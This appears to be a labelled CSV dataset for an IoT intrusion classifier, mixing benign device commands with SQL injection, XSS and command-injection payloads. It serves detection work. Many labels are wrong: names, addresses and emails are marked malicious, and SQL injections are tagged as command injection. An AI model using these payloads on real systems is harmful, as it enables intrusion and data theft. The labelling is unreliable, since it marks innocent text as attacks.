payload,label,attack_type
"echo, ['device']",benign,norm
"echo, ['sensor', 'ready', 'ok']",benign,norm
"run_cmd, echo ['world', 'normal', 'sensor', 'iot']",benign,norm
"echo, ['world', 'iot', 'normal', 'ready']",benign,norm
"1""))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((""zzcd""=""zzcd",malicious,cmd_parse_error
"start_temp_report, 98",benign,norm
"1'||(select 'jonh' from dual where 2415=2415 union all select null,null,null,null,null,null,null,null,null--",malicious,cmdi
thomson.kmit9@somagel.sk,malicious,cmd_parse_error
"run_cmd, ADD 424 239",benign,norm
"run_cmd, ADD 130 375",benign,norm
"1));select benchmark(5000000,md5(0x4c4d6142)) and ((6866=6866",malicious,cmdi
"run_cmd, ADD 456 439",benign,norm
"run_cmd, ADD 721 544",benign,norm
68203466w,malicious,cmd_parse_error
"run_cmd, echo ['report']",benign,norm
"run_cmd, ADD 185 13",benign,norm
"run_cmd, ADD 887 647",benign,norm
3625,malicious,cmd_parse_error
"run_cmd, echo ['data', 'system', 'world']",benign,norm
"run_cmd, echo ['ok', 'payload', 'sensor', 'ping']",benign,norm
"run_cmd, echo ['esp32']",benign,norm
-5134))) or 8571=8571--,malicious,cmd_parse_error
"1'))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('zeum'='zeum",malicious,cmd_parse_error
"run_cmd, echo ['data', 'esp32']",benign,norm
"run_cmd, ADD 389 851",benign,norm
san perfecto 8,malicious,cmd_parse_error
"1'));iif(5571=4947,1,1/0)",malicious,cmdi
"echo, ['world', 'iot', 'mqtt']",benign,norm
15ma0de9o,malicious,cmd_parse_error
"echo, ['system', 'ping']",benign,norm
"start_temp_report, 69",benign,norm
"start_temp_report, 104",benign,norm
"run_cmd, ADD 940 776",benign,norm
51518827t,malicious,cmd_parse_error
"arfe, 119 11?g",malicious,cmd_parse_error
"echo, ['ready', 'sensor', 'ok']",benign,norm
"start_temp_report, 79",benign,norm
"echo, ['iot']",benign,norm
6202740443449579,malicious,cmd_parse_error
"echo, ['device', 'ok', 'mqtt', 'status']",benign,norm
1' and 4374=2305,malicious,cmd_parse_error
gaudencio,malicious,cmd_parse_error
"run_cmd, ADD 690 441",benign,norm
mont?acargas,malicious,cmd_parse_error
"1))) union all select null,null,null#",malicious,cmd_parse_error
"-7041""))) union all select 2159,2159,2159,2159,2159--",malicious,cmd_parse_error
1) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),malicious,cmdi
bisaurri,malicious,cmd_parse_error
"echo, ['sensor']",benign,norm
"+dir+c:"",8,cmdi,anom $&&dir+c:""",malicious,cmdi
"run_cmd, ADD 127 752",benign,norm
"start_temp_report, 107",benign,norm
8167,malicious,cmd_parse_error
"run_cmd, echo ['iot', 'system', 'ready']",benign,norm
"start_temp_report, 30",benign,norm
"1' where 1895=1895 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",malicious,cmd_parse_error
4646925880970082,malicious,cmd_parse_error
volkmann_parfrey1@sigloventidos.be,malicious,cmd_parse_error
"1%""))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""%""=""",malicious,cmdi
"run_cmd, ADD 946 649",benign,norm
1')) as mbzk where 9153=9153 and 2006=2006,malicious,cmd_parse_error
"-6599%"")) or make_set(9354=9354,7185) and ((""%""=""",malicious,cmd_parse_error
"run_cmd, ADD 654 548",benign,norm
"start_temp_report, 103",benign,norm
"start_temp_report, 106",benign,norm
"start_temp_report, 84",benign,norm
47339400h,malicious,cmd_parse_error
"run_cmd, echo ['report']",benign,norm
"run_cmd, ADD 608 286",benign,norm
7547,malicious,cmd_parse_error
voglis@hiperxxx.au,malicious,cmd_parse_error
"c/ la miraculosa, 147",malicious,cmd_parse_error
"run_cmd, ADD 543 930",benign,norm
jochen,malicious,cmd_parse_error
"start_temp_report, 30",benign,norm
"run_cmd, ADD 532 311",benign,norm
"1' in boolean mode) union all select null,null,null,null,null,null#",malicious,cmd_parse_error
"run_cmd, ADD 890 444",benign,norm
78595518x,malicious,cmd_parse_error
"start_temp_report, 102",benign,norm
socorro,malicious,cmd_parse_error
grandlocua,malicious,cmd_parse_error
1'||(select 'ovlx' where 8767=8767 or sleep(5))||',malicious,cmdi
"run_cmd, echo ['payload', 'normal', 'device', 'mqtt']",benign,norm
balcells parets,malicious,cmd_parse_error
"run_cmd, echo ['safe', 'payload', 'ping']",benign,norm
"run_cmd, echo ['iot', 'device', 'world', 'report']",benign,norm
17179,malicious,cmd_parse_error
"run_cmd, echo ['iot', 'ok']",benign,norm
"echo, ['report']",benign,norm
"1"" or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)",malicious,cmdi
"echo, ['ping', 'data', 'world', 'system']",benign,norm
"echo, ['iot']",benign,norm
"run_cmd, ADD 166 604",benign,norm
"run_cmd, ADD 92 916",benign,norm
"echo, ['system', 'sensor', 'data', 'device']",benign,norm
"run_cmd, ADD 316 843",benign,norm
"start_temp_report, 15",benign,norm
"1"" rlike sleep(5)",malicious,cmd_parse_error
"echo, ['data', 'ready', 'normal', 'mqtt']",benign,norm
"1 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))-- gkcl",malicious,cmdi
gargajienta,malicious,cmd_parse_error
"run_cmd, ADD 146 691",benign,norm
"run_cmd, echo ['system', 'ok']",benign,norm
"echo, ['device']",benign,norm
"echo, ['esp32', 'mqtt']",benign,norm
cecchini_polonsky@iurispretor.info,malicious,cmd_parse_error
feliu,malicious,cmd_parse_error
"run_cmd, echo ['ready']",benign,norm
"run_cmd, echo ['mqtt', 'safe', 'system']",benign,norm
nickie,malicious,cmd_parse_error
"-5193 where 2175=2175 union all select 2175,2175,2175,2175,2175,2175,2175,2175,2175,2175#",malicious,cmd_parse_error
"echo, ['sensor', 'iot', 'device']",benign,norm
"run_cmd, ADD 894 535",benign,norm
turus,malicious,cmd_parse_error
"run_cmd, echo ['safe', 'report', 'ready']",benign,norm
"1""));select (case when (3855=3855) then 3855 else 1/(select 0) end)--",malicious,cmdi
cervi fornas,malicious,cmd_parse_error
savitsky@tetdevelocidad.sj,malicious,cmd_parse_error
"echo, ['normal', 'status', 'system', 'payload']",benign,norm
"run_cmd, echo ['ok', 'mqtt', 'esp32']",benign,norm
aras de los olmos,malicious,cmd_parse_error
"run_cmd, ADD 244 342",benign,norm
bangert,malicious,cmd_parse_error
"run_cmd, echo ['iot', 'mqtt']",benign,norm
fulvia,malicious,cmd_parse_error
sharron,malicious,cmd_parse_error
plza. maimonides 197,malicious,cmd_parse_error
viola5,malicious,cmd_parse_error
"run_cmd, echo ['world', 'hello', 'ping', 'system']",benign,norm
"start_temp_report, 37",benign,norm
"echo, ['safe', 'ping']",benign,norm
"run_cmd, ADD 126 788",benign,norm
"echo, ['safe', 'mqtt', 'ok', 'ready']",benign,norm
"echo, ['system', 'status', 'mqtt']",benign,norm
"run_cmd, echo ['mqtt', 'world', 'iot']",benign,norm
"start_temp_report, 21",benign,norm
"1""))) or 8466=benchmark(5000000,md5(0x694a4745)) and (((""ijag""=""ijag",malicious,cmd_parse_error
"echo, ['world', 'status']",benign,norm
"1""))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((""ytju"" like ""ytju",malicious,cmd_parse_error
1) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (3836=3836,malicious,cmdi
26520,malicious,cmd_parse_error
vindicacin,malicious,cmd_parse_error
1') where 6305=6305 rlike (select (case when (8326=9749) then 1 else 0x28 end))--,malicious,cmd_parse_error
"c/ ricardo codoer, 112,",malicious,cmd_parse_error
avril,malicious,cmd_parse_error
graciot ballv,malicious,cmd_parse_error
"fierro 66, 3?e",malicious,cmd_parse_error
"run_cmd, ADD 69 210",benign,norm
0m24gu1l39,malicious,cmd_parse_error
"echo, ['ping', 'hello', 'mqtt']",benign,norm
geir,malicious,cmd_parse_error
"echo, ['report', 'ping', 'ready']",benign,norm
1)));if(3490=4920) select 3490 else drop function hlzt--,malicious,cmdi
1')) or sleep(5)#,malicious,cmd_parse_error
"start_temp_report, 95",benign,norm
"run_cmd, echo ['safe', 'status', 'hello']",benign,norm
"start_temp_report, 116",benign,norm
c632i6ela,malicious,cmd_parse_error
"1"" where 9135=9135 and elt(4249=4249,7259)--",malicious,cmd_parse_error
"-1<br size=""&{document.cookie=true}"">",malicious,cmdi
"run_cmd, echo ['data']",benign,norm
rabulas,malicious,cmd_parse_error
"start_temp_report, 20",benign,norm
"1' and 3824=benchmark(5000000,md5(0x76555642)) and 'hmqq'='hmqq",malicious,cmd_parse_error
"run_cmd, ADD 510 152",benign,norm
"echo, ['ready', 'device', 'mqtt', 'system']",benign,norm
rehenchida,malicious,cmd_parse_error
"run_cmd, ADD 879 766",benign,norm
reaves-phillips@baybay.tm,malicious,cmd_parse_error
"run_cmd, ADD 357 141",benign,norm
"run_cmd, ADD 378 682",benign,norm
zelada,malicious,cmd_parse_error
32170,malicious,cmd_parse_error
"echo, ['ready']",benign,norm
"run_cmd, echo ['ping', 'normal', 'ready']",benign,norm
"1 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)",malicious,cmdi
"1%"") and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (""%""=""",malicious,cmdi
"1%"")));select (case when (5464=9350) then 5464 else cast(1 as int)/(select 0 from dual) end) from dual--",malicious,cmdi
"-1<input type=""image"" dynsrc=""javascript:document.cookie=true;"">",malicious,cmdi
"run_cmd, ADD 622 495",benign,norm
"1') and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))",malicious,cmd_parse_error
"echo, ['report', 'payload', 'esp32']",benign,norm
"start_temp_report, 69",benign,norm
"echo, ['esp32', 'device', 'iot']",benign,norm
"run_cmd, echo ['sensor', 'esp32']",benign,norm
"run_cmd, ADD 184 11",benign,norm
4150902070293588,malicious,cmd_parse_error
"1"") or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (""cdnc"" like ""cdnc",malicious,cmd_parse_error
"start_temp_report, 26",benign,norm
"run_cmd, ADD 201 672",benign,norm
1' where 5819=5819 and (1275=4759)*4759--,malicious,cmd_parse_error
"run_cmd, ADD 602 176",benign,norm
"echo, ['esp32', 'system']",benign,norm
-8966%' or (7475=4014)*4014 and '%'=',malicious,cmd_parse_error
7ngr5ta3ente,malicious,cmd_parse_error
"run_cmd, ADD 404 652",benign,norm
"1' (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))",malicious,cmdi
"start_temp_report, 3",benign,norm
"run_cmd, echo ['esp32']",benign,norm
6849,malicious,cmd_parse_error
"echo, ['status', 'normal', 'report', 'mqtt']",benign,norm
"run_cmd, echo ['safe', 'system', 'esp32', 'report']",benign,norm
"start_temp_report, 61",benign,norm
"start_temp_report, 119",benign,norm
"run_cmd, echo ['safe', 'iot', 'system', 'hello']",benign,norm
ketley,malicious,cmd_parse_error
"echo, ['system']",benign,norm
ruick_heasley4@18horas.ro,malicious,cmd_parse_error
aida 184,malicious,cmd_parse_error
"run_cmd, echo ['ok', 'normal', 'world', 'iot']",benign,norm
batidor,malicious,cmd_parse_error
"-1<style>li {list-style-image: url(""javascript:document.cookie=true;"");</style><ul><li>crosssitescripting",malicious,xss
"start_temp_report, 50",benign,norm
"1%"") and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (""%""=""",malicious,cmd_parse_error
"run_cmd, echo ['ok', 'sensor', 'hello']",benign,norm
"-3827"") or 8571=8571--",malicious,cmd_parse_error
-9893' or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'pbop'='pbop,malicious,cmdi
43785,malicious,cmd_parse_error
laureano,malicious,cmd_parse_error
"run_cmd, ADD 279 804",benign,norm
98089077b,malicious,cmd_parse_error
"run_cmd, echo ['sensor', 'mqtt', 'safe']",benign,norm
58031849c,malicious,cmd_parse_error
"run_cmd, echo ['safe']",benign,norm
"run_cmd, ADD 862 527",benign,norm
herrmann@codwatw.edu,malicious,cmd_parse_error
12449,malicious,cmd_parse_error
"run_cmd, ADD 212 412",benign,norm
"-3278')) or elt(1032=1032,3623) and (('zxig' like 'zxig",malicious,cmd_parse_error
catatipia,malicious,cmd_parse_error
"run_cmd, echo ['report', 'data', 'hello']",benign,norm
sonoramente,malicious,cmd_parse_error
"1"") where 3507=3507;select benchmark(5000000,md5(0x4c4d6142))--",malicious,cmdi
"1"")) and (1248=8705)*8705 and ((""wvma"" like ""wvma",malicious,cmd_parse_error
73spojador,malicious,cmd_parse_error
7798282598558124,malicious,cmd_parse_error
"run_cmd, echo ['system', 'ready']",benign,norm
"echo, ['device', 'ready', 'safe']",benign,norm
389,malicious,cmd_parse_error
"run_cmd, ADD 638 827",benign,norm
"calle lirios, 51, 3?a",malicious,cmd_parse_error
"start_temp_report, 50",benign,norm
"-6220' union all select 1462,1462#",malicious,cmd_parse_error
"start_temp_report, 104",benign,norm
1'+(select 'rejz' where 1530=1530 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))+',malicious,cmdi
"1%')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",malicious,cmdi
"run_cmd, ADD 565 473",benign,norm
ericsson,malicious,cmd_parse_error
"run_cmd, echo ['sensor', 'normal']",benign,norm
con2e5u934e1215e,malicious,cmd_parse_error
5350,malicious,cmd_parse_error
"run_cmd, ADD 909 105",benign,norm
"run_cmd, ADD 352 936",benign,norm
95549133a,malicious,cmd_parse_error
faja de la sierra,malicious,cmd_parse_error
"start_temp_report, 58",benign,norm
"run_cmd, echo ['iot', 'esp32']",benign,norm
c/ doctor coll s/n 8g,malicious,cmd_parse_error
"1) and 8635=(select count(*) from generate_series(1,5000000))--",malicious,cmd_parse_error
quintana redonda,malicious,cmd_parse_error
"run_cmd, ADD 965 568",benign,norm
"echo, ['data', 'device', 'safe', 'report']",benign,norm
oliverio,malicious,cmd_parse_error
08691,malicious,cmd_parse_error
"echo, ['ready', 'payload', 'esp32', 'ok']",benign,norm
"echo, ['ping', 'normal']",benign,norm
"run_cmd, echo ['hello', 'ping']",benign,norm
"run_cmd, echo ['ping']",benign,norm
"echo, ['ready', 'world', 'esp32']",benign,norm
"run_cmd, ADD 757 678",benign,norm
"run_cmd, echo ['ok', 'iot', 'esp32']",benign,norm
"run_cmd, echo ['system', 'ok']",benign,norm
"run_cmd, echo ['status', 'data']",benign,norm
"echo, ['ping']",benign,norm
"run_cmd, ADD 757 51",benign,norm
"echo, ['data', 'mqtt', 'ready']",benign,norm
"run_cmd, ADD 879 681",benign,norm
"echo, ['payload']",benign,norm
20741927k,malicious,cmd_parse_error
"echo, ['normal', 'world', 'hello']",benign,norm
"1') where 1093=1093 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",malicious,cmd_parse_error
heidemann@ppmanzanares.cg,malicious,cmd_parse_error
"echo, ['data', 'payload', 'status']",benign,norm
"1))) and elt(1210=1210,sleep(5)) and (((2341=2341",malicious,cmd_parse_error
0142716118287558,malicious,cmd_parse_error
"run_cmd, ADD 356 5",benign,norm
"start_temp_report, 74",benign,norm
"1 union all select null,null,null,null#",malicious,cmd_parse_error
`false`,malicious,cmdi
"1""))) and 4595=4595#",malicious,cmd_parse_error
"run_cmd, echo ['sensor', 'safe', 'esp32']",benign,norm
"start_temp_report, 112",benign,norm
genet,malicious,cmd_parse_error
"run_cmd, echo ['world']",benign,norm
46702832k,malicious,cmd_parse_error
"run_cmd, echo ['payload', 'ok', 'sensor', 'iot']",benign,norm
"start_temp_report, 103",benign,norm
c/ valero bermejo 190 12c,malicious,cmd_parse_error
"1'+(select immd where 7499=7499 union all select null,null,null,null,null,null,null,null#",malicious,cmd_parse_error
"1"") and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""hsaw""=""hsaw",malicious,cmd_parse_error
"run_cmd, echo ['status', 'device', 'iot']",benign,norm
"start_temp_report, 107",benign,norm
"run_cmd, echo ['iot', 'ping', 'sensor', 'data']",benign,norm
"start_temp_report, 92",benign,norm
"run_cmd, echo ['ping']",benign,norm
"1') as najc where 5213=5213 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",malicious,cmd_parse_error
"1""))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""wvyb""=""wvyb",malicious,cmd_parse_error
"1)) as bebl where 2597=2597 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",malicious,cmdi
"run_cmd, echo ['sensor', 'payload', 'status']",benign,norm
aniano,malicious,cmd_parse_error
1er87n30689,malicious,cmd_parse_error
"run_cmd, ADD 288 409",benign,norm
"run_cmd, ADD 835 185",benign,norm
"start_temp_report, 39",benign,norm
"echo, ['ready', 'normal']",benign,norm
.corporativo,malicious,cmd_parse_error
"1')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)",malicious,cmdi
"1'||(select 'qsgi' where 1707=1707 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))||'",malicious,cmdi
668,malicious,cmd_parse_error
"start_temp_report, 49",benign,norm
"-9774'))) union all select 6954,6954,6954#",malicious,cmd_parse_error
"echo, ['ready', 'system', 'hello']",benign,norm
"1 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))# ogwe",malicious,cmd_parse_error
"1"") as dfmm where 7563=7563 or 8421=(select count(*) from generate_series(1,5000000))--",malicious,cmd_parse_error
"start_temp_report, 120",benign,norm
vaillant altimir,malicious,cmd_parse_error
38355013y,malicious,cmd_parse_error
collazos de boedo,malicious,cmd_parse_error
